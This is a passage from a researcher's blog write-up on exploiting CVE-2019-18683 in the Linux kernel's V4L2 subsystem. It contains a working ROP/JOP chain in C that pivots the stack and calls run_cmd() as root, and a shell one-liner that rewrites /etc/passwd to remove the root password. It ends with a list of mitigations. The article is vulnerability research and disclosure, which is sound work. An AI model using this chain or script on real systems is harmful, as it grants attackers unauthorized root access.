	<span class="n">memops</span><span class="p">,</span>
	<span class="n">memops</span><span class="o">-&gt;</span><span class="n">vaddr</span><span class="p">,</span>
	<span class="o">&amp;</span><span class="p">(</span><span class="n">memops</span><span class="o">-&gt;</span><span class="n">vaddr</span><span class="p">));</span>
</code></pre></div></div>

<p>And the following diagram describes how the adapted payload parts are interconnected in the kernel memory:
<img src="./2020 - CVE-2019-18683 Exploiting a Linux kernel vulnerability in the V4L2 subsystem_files/v4l2_payload.png" alt="payload anatomy"></p>

<h2 id="ropnjop">ROP'n'JOP</h2>

<p>Now I'm going to tell about the ROP chain that I created for these special circumstances.</p>

<p>As you can see, I've found an excellent stack-pivoting gadget that fits to <code class="language-plaintext highlighter-rouge">void *(*vaddr)(void *buf_priv)</code>, where the control flow is hijacked. The <code class="language-plaintext highlighter-rouge">buf_priv</code> argument is taken from the <code class="language-plaintext highlighter-rouge">vb2_plane.mem_priv</code>, which is under our control. In the Linux kernel on <code class="language-plaintext highlighter-rouge">x86_64</code>, the first function argument is passed via the <code class="language-plaintext highlighter-rouge">RDI</code> register. So the sequence <code class="language-plaintext highlighter-rouge">push rdi; pop rsp</code> switches the stack pointer to the controlled location (it is on the kernel stack as well, so <code class="language-plaintext highlighter-rouge">SMAP</code> and <code class="language-plaintext highlighter-rouge">SMEP</code> are bypassed).</p>

<p>Then comes the ROP chain for local privilege escalation. It is unusual because it is executed in the kernel thread context (as described earlier in this write-up).</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define ROP__PUSH_RDI__POP_RSP__pop_rbp__or_eax_edx__RET 0xffffffff814725f1
#define ROP__POP_R15__RET 0xffffffff81084ecf
#define ROP__POP_RDI__RET 0xffffffff8101ef05
#define ROP__JMP_R15 0xffffffff81c071be
#define ADDR_RUN_CMD 0xffffffff810b4ed0
#define ADDR_DO_TASK_DEAD 0xffffffff810bf260
</span>
<span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">rop</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="kt">char</span> <span class="o">*</span><span class="n">cmd</span> <span class="o">=</span> <span class="s">"/bin/sh /home/a13x/pwn"</span><span class="p">;</span> <span class="cm">/* rewrites /etc/passwd to drop root password */</span>
<span class="kt">size_t</span> <span class="n">cmdlen</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="cm">/* for 0 byte */</span>

<span class="cm">/* mem_priv is the arg for vaddr() */</span>
<span class="n">vplane</span> <span class="o">=</span> <span class="n">vbuf</span><span class="o">-&gt;</span><span class="n">vb</span><span class="p">.</span><span class="n">vb2_buf</span><span class="p">.</span><span class="n">planes</span><span class="p">;</span>
<span class="n">vplane</span><span class="o">-&gt;</span><span class="n">mem_priv</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">kstack</span> <span class="o">-</span> <span class="n">TIMEX_STACK_OFFSET</span> <span class="o">+</span> <span class="n">ROP_CHAIN_OFFSET</span><span class="p">);</span>

<span class="n">rop</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">timex_addr</span> <span class="o">+</span> <span class="n">ROP_CHAIN_OFFSET</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"   rop chain will be at %p, userspace %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">vplane</span><span class="o">-&gt;</span><span class="n">mem_priv</span><span class="p">,</span> <span class="n">rop</span><span class="p">);</span>

<span class="n">strncpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">timex_addr</span> <span class="o">+</span> <span class="n">CMD_OFFSET</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">cmdlen</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"   cmd will be at %lx, userspace %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
	<span class="p">(</span><span class="n">kstack</span> <span class="o">-</span> <span class="n">TIMEX_STACK_OFFSET</span> <span class="o">+</span> <span class="n">CMD_OFFSET</span><span class="p">),</span>
	<span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">timex_addr</span> <span class="o">+</span> <span class="n">CMD_OFFSET</span><span class="p">);</span>

<span class="cm">/* stack will be trashed near rop chain, be careful with CMD_OFFSET */</span>
<span class="o">*</span><span class="n">rop</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x1337133713371337</span><span class="p">;</span> <span class="cm">/* placeholder for pop rbp in the pivoting gadget */</span>
<span class="o">*</span><span class="n">rop</span><span class="o">++</span> <span class="o">=</span> <span class="n">ROP__POP_R15__RET</span> <span class="o">+</span> <span class="n">kaslr_offset</span><span class="p">;</span>
<span class="o">*</span><span class="n">rop</span><span class="o">++</span> <span class="o">=</span> <span class="n">ADDR_RUN_CMD</span> <span class="o">+</span> <span class="n">kaslr_offset</span><span class="p">;</span>
<span class="o">*</span><span class="n">rop</span><span class="o">++</span> <span class="o">=</span> <span class="n">ROP__POP_RDI__RET</span> <span class="o">+</span> <span class="n">kaslr_offset</span><span class="p">;</span>
<span class="o">*</span><span class="n">rop</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="n">kstack</span> <span class="o">-</span> <span class="n">TIMEX_STACK_OFFSET</span> <span class="o">+</span> <span class="n">CMD_OFFSET</span><span class="p">);</span>
<span class="o">*</span><span class="n">rop</span><span class="o">++</span> <span class="o">=</span> <span class="n">ROP__JMP_R15</span> <span class="o">+</span> <span class="n">kaslr_offset</span><span class="p">;</span>
<span class="o">*</span><span class="n">rop</span><span class="o">++</span> <span class="o">=</span> <span class="n">ROP__POP_R15__RET</span> <span class="o">+</span> <span class="n">kaslr_offset</span><span class="p">;</span>
<span class="o">*</span><span class="n">rop</span><span class="o">++</span> <span class="o">=</span> <span class="n">ADDR_DO_TASK_DEAD</span> <span class="o">+</span> <span class="n">kaslr_offset</span><span class="p">;</span>
<span class="o">*</span><span class="n">rop</span><span class="o">++</span> <span class="o">=</span> <span class="n">ROP__JMP_R15</span> <span class="o">+</span> <span class="n">kaslr_offset</span><span class="p">;</span>

<span class="n">printf</span><span class="p">(</span><span class="s">" [+] the payload for kernel heap and stack is ready. Put it.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
</code></pre></div></div>

<p>This ROP chain loads the address of the kernel function <code class="language-plaintext highlighter-rouge">run_cmd()</code> from <code class="language-plaintext highlighter-rouge">kernel/reboot.c</code> to the <code class="language-plaintext highlighter-rouge">R15</code> register. Then it saves the address of the shell command to the <code class="language-plaintext highlighter-rouge">RDI</code> register. That address will be passed to <code class="language-plaintext highlighter-rouge">run_cmd()</code> as an argument. Then the ROP chain performs some JOP'ing :) It jumps to <code class="language-plaintext highlighter-rouge">run_cmd()</code> that executes <code class="language-plaintext highlighter-rouge">/bin/sh /home/a13x/pwn</code> with root privileges. That script rewrites <code class="language-plaintext highlighter-rouge">/etc/passwd</code> allowing to login as root without a password:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
<span class="c"># drop root password</span>
<span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'1s/.*/root::0:0:root:\/root:\/bin\/bash/'</span> /etc/passwd
</code></pre></div></div>

<p>Then the ROP chain jumps to <code class="language-plaintext highlighter-rouge">__noreturn do_task_dead()</code> from <code class="language-plaintext highlighter-rouge">kernel/exit.c</code>. I do so for so-called system fixating: if this kthread is not stopped, it provokes some unnecessary kernel crashes.</p>

<h2 id="possible-exploit-mitigation">Possible exploit mitigation</h2>

<p>There are several kernel hardening features that could interfere with different parts of this exploit.</p>

<ol>
  <li>
    <p>Setting <code class="language-plaintext highlighter-rouge">/proc/sys/vm/unprivileged_userfaultfd</code> to <code class="language-plaintext highlighter-rouge">0</code> would block the described method of keeping the payload in the kernelspace. That toggle restricts <code class="language-plaintext highlighter-rouge">userfaultfd()</code> to only privileged users (with <code class="language-plaintext highlighter-rouge">SYS_CAP_PTRACE</code> capability).</p>
  </li>
  <li>
    <p>Setting <code class="language-plaintext highlighter-rouge">kernel.dmesg_restrict</code> sysctl to <code class="language-plaintext highlighter-rouge">1</code> would block the infoleak via kernel log. That sysctl restricts the ability of unprivileged users to read the kernel syslog via <code class="language-plaintext highlighter-rouge">dmesg</code>. However, even with <code class="language-plaintext highlighter-rouge">kernel.dmesg_restrict = 1</code>, Ubuntu users from the <code class="language-plaintext highlighter-rouge">adm</code> group can read the kernel log from <code class="language-plaintext highlighter-rouge">/var/log/syslog</code>.</p>
  </li>
  <li><a href="https://grsecurity.net/features">grsecurity/PaX</a> patch has an interesting feature called <code class="language-plaintext highlighter-rouge">PAX_RANDKSTACK</code>, which would make the exploit guess the <code class="language-plaintext highlighter-rouge">vb2_queue</code> location: <br>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  +config PAX_RANDKSTACK
  +	bool "Randomize kernel stack base"
  +	default y if GRKERNSEC_CONFIG_AUTO &amp;&amp; !(GRKERNSEC_CONFIG_VIRT_HOST &amp;&amp; GRKERNSEC_CONFIG_VIRT_VIRTUALBOX)
  +	depends on X86_TSC &amp;&amp; X86
  +	help
  +	  By saying Y here the kernel will randomize every task's kernel
  +	  stack on every system call.  This will not only force an attacker
  +	  to guess it but also prevent him from making use of possible
  +	  leaked information about it.
  +
  +	  Since the kernel stack is a rather scarce resource, randomization
  +	  may cause unexpected stack overflows, therefore you should very
  +	  carefully test your system.  Note that once enabled in the kernel
  +	  configuration, this feature cannot be disabled on a per file basis.
  +
</code></pre></div>    </div>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">PAX_RAP</code> from <a href="https://grsecurity.net/features">grsecurity/PaX</a> patch should prevent my ROP/JOP chain that is described above.</p>
  </li>
  <li>Hopefully in future Linux kernel will have <a href="https://community.arm.com/developer/ip-products/processors/b/processors-ip-blog/posts/enhancing-memory-safety">ARM Memory Tagging Extension (MTE)</a> support, which will mitigate use-after-free similar to one I exploited.</li>
</ol>

<h2 id="conclusion">Conclusion</h2>

<p>Investigating and fixing <code class="language-plaintext highlighter-rouge">CVE-2019-18683</code>, developing the PoC exploit, and writing this article has been a big deal for me.</p>

<p>I hope you have enjoyed reading it.</p>

<p>I want to thank <a href="https://www.ptsecurity.com/ww-en/">Positive Technologies</a> for giving me the opportunity to work on this research.</p>

<p>I would appreciate the feedback. See my contacts below.</p>


  </div><a class="u-url" href="https://a13xp0p0v.github.io/2020/02/15/CVE-2019-18683.html" hidden=""></a>
</article>

      </div>
    </main><footer class="site-footer">

  <div class="wrapper">

    <h2 class="footer-heading">Contacts</h2>

      <div class="footer-col footer-col-1">
        <ul class="social-media-list">
          
            <li>
              <a href="mailto:alex.popov@linux.com">
                <span class="icon  icon--email">
                  <svg fill="#828282" height="17px" width="17px" viewBox="0 0 24 24">
                  <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"></path>
                  <path d="M0 0h24v24H0z" fill="none"></path>
                  </svg>
                </span>
		<span class="username">alex.popov@linux.com</span>
              </a>
            </li>
          

          
          <li>
            <a href="https://twitter.com/a13xp0p0v"><span class="icon icon--twitter"><svg viewBox="0 0 16 16" width="16px" height="16px"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"></path></svg>
</span><span class="username">a13xp0p0v</span></a>

          </li>
          

	  
          <li>
            <a href="https://github.com/a13xp0p0v"><span class="icon icon--github"><svg viewBox="0 0 16 16" width="16px" height="16px"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"></path></svg>
</span><span class="username">a13xp0p0v</span></a>

          </li>
          

	  
	  <li>
	    <a href="https://t.me/a13xp0p0v">
	      <span class="icon  icon--telegram">
		  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#828282" class="bi bi-telegram" viewBox="0 0 16 16">
		  <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM8.287 5.906c-.778.324-2.334.994-4.666
		  2.01-.378.15-.577.298-.595.442-.03.243.275.339.69.47l.175.055c.408.133.958.288
		  1.243.294.26.006.549-.1.868-.32 2.179-1.471 3.304-2.214 3.374-2.23.05-.012.12-.026.166.016.047.041.042.12.037.141-.03.129-1.227
		  1.241-1.846 1.817-.193.18-.33.307-.358.336a8.154 8.154 0 0 1-.188.186c-.38.366-.664.64.015
		  1.088.327.216.589.393.85.571.284.194.568.387.936.629.093.06.183.125.27.187.331.236.63.448.997.414.214-.02.435-.22.547-.82.265-1.417.786-4.486.906-5.751a1.426
		  1.426 0 0 0-.013-.315.337.337 0 0 0-.114-.217.526.526 0 0 0-.31-.093c-.3.005-.763.166-2.984 1.09z"></path>
		  </svg>
	      </span>
	      <span class="username">a13xp0p0v</span>
	    </a>
	  </li>
          

	  
	  <li>
	    <a href="https://www.linkedin.com/in/a13xp0p0v">
	      <span class="icon  icon--linkedin">
		  <svg viewBox="0 0 512 512" width="16px" height="16px">
	          <path fill="#828282" d="M150.65,100.682c0,27.992-22.508,50.683-50.273,50.683c-27.765,0-50.273-22.691-50.273-50.683
	          C50.104,72.691,72.612,50,100.377,50C128.143,50,150.65,72.691,150.65,100.682z M143.294,187.333H58.277V462h85.017V187.333z
	          M279.195,187.333h-81.541V462h81.541c0,0,0-101.877,0-144.181c0-38.624,17.779-61.615,51.807-61.615
	          c31.268,0,46.289,22.071,46.289,61.615c0,39.545,0,144.181,0,144.181h84.605c0,0,0-100.344,0-173.915
	          s-41.689-109.131-99.934-109.131s-82.768,45.369-82.768,45.369V187.333z"></path>
	        </svg>
	      </span>
	      <span class="username">a13xp0p0v</span>
	    </a>
	  </li>
          
        </ul>
      </div>

  </div>

</footer>



</body></html>